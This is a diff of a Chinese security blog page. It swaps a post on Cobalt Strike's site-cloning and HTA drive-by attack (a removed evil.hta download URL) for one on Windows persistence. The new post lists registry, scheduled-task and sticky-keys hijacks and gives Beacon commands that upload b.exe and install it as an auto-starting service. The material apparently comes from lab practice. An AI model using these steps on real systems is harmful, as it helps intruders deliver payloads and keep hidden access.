@@ -4,18 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="clonesite, Broken-year">
-    <meta name="description" content="Clonesite自动克隆网站内容
-Attacks-&amp;gt;HTML Application
+    <meta name="keywords" content="cs-power, Broken-year">
+    <meta name="description" content="cs-权限维持
+权限维持（windows）
+可以使用注册表或者启动项，计划任务，服务，shift，放大镜功能，各种劫持或者利用各种安装的软件
 
-
-
-会生成一个elil.html文件
-保存下来，然后打开Attacks-&amp;gt;Web Drive-by-&amp;gt;Host File
-
-
-
-点击">
+实例
+Attacks-&amp;gt;Packages-&amp;gt;Windows Executable (">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -27,7 +22,7 @@ Attacks-&amp;gt;HTML Application
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>clonesite | Broken-year</title>
+    <title>cs-power | Broken-year</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -319,12 +314,12 @@ Attacks-&amp;gt;HTML Application
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">clonesite</h1>
+                    <h1 class="description center-align post-title">cs-power</h1>
                 </div>
             </div>
         </div>
@@ -494,32 +489,24 @@ Attacks-&amp;gt;HTML Application
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Clonesite自动克隆网站内容"><a href="#Clonesite自动克隆网站内容" class="headerlink" title="Clonesite自动克隆网站内容"></a>Clonesite自动克隆网站内容</h1><blockquote>
-<p>Attacks-&gt;HTML Application</p>
-</blockquote>
-<p><img src="/2022/03/16/clonesite/cs-html.png" alt="image-20220316161114943"></p>
-<blockquote>
-<p>会生成一个elil.html文件</p>
-<p>保存下来，然后打开Attacks-&gt;Web Drive-by-&gt;Host File</p>
-</blockquote>
-<p><img src="/2022/03/16/clonesite/cs-hostfile.png" alt="image-20220316161955804"></p>
-<blockquote>
-<p>点击Launch之后会生成一个新的连接，把他保存下来，然后让目标执行</p>
-<pre><code>http://192.168.43.46:80/download/evil.hta
-</code></pre>
-</blockquote>
-<p><img src="/2022/03/16/clonesite/cs-yes.png" alt="image-20220316163222547"></p>
-<blockquote>
-<p>上线成功</p>
+                <h1 id="cs-权限维持"><a href="#cs-权限维持" class="headerlink" title="cs-权限维持"></a>cs-权限维持</h1><blockquote>
+<p>权限维持（windows）</p>
+<p>可以使用注册表或者启动项，计划任务，服务，shift，放大镜功能，各种劫持或者利用各种安装的软件</p>
 </blockquote>
 <h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><blockquote>
-<p>Attacks-&gt;Web Drive-by-&gt;Clone Site</p>
+<p>Attacks-&gt;Packages-&gt;Windows Executable (s)</p>
 </blockquote>
-<p><img src="/2022/03/16/clonesite/cs-clone.png" alt="image-20220316163814123"></p>
+<p><img src="/2022/03/16/cs-power/cs-executable.png" alt="image-20220316203258034"></p>
 <blockquote>
-<p>会克隆一个百度的网站，靶机访问他的话就会中招</p>
+<p>保存下来,然后进入Beacon</p>
 </blockquote>
-<p><img src="/2022/03/16/clonesite/cs-baidu.png" alt="image-20220316164039021"></p>
+<pre><code>cd c:\windows\temp      //进入靶机c盘windows下的temp目录
+upload /root/b.exe        //把保存下来的脚本上传上去
+shell sc create &quot;thisserver&quot; binpath=&quot;c:\windows\team\b.exe&quot; //创建系统服务
+shell sc description &quot;thisserver&quot; &quot;zheshifuwu&quot;        //描述服务
+shell sc config &quot;thisserver&quot; start=auto        //设置为自动开启
+shell net start &quot;thisserver&quot;                //开启服务
+</code></pre>
 
                 
             </div>
@@ -546,7 +533,7 @@ Attacks-&amp;gt;HTML Application
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Broken-year.github.io/2022/03/16/clonesite/">http://Broken-year.github.io/2022/03/16/clonesite/</a>
+                    <a href="http://Broken-year.github.io/2022/03/16/cs-power/">http://Broken-year.github.io/2022/03/16/cs-power/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -767,9 +754,10 @@ Attacks-&amp;gt;HTML Application
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/03/16/cs-power/">
                     <div class="card-image">
@@ -787,9 +775,9 @@ Attacks-&amp;gt;HTML Application
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-16
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -802,6 +790,7 @@ Attacks-&amp;gt;HTML Application
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -828,13 +817,13 @@ Attacks-&amp;gt;HTML Application
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/15/cs-aggresor/">
+                <a href="/2022/03/16/clonesite/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="cs-aggresor">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="clonesite">
                         
-                        <span class="card-title">cs-aggresor</span>
+                        <span class="card-title">clonesite</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -845,7 +834,7 @@ Attacks-&amp;gt;HTML Application
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-16
                             </span>
                         <span class="publish-author">
                             
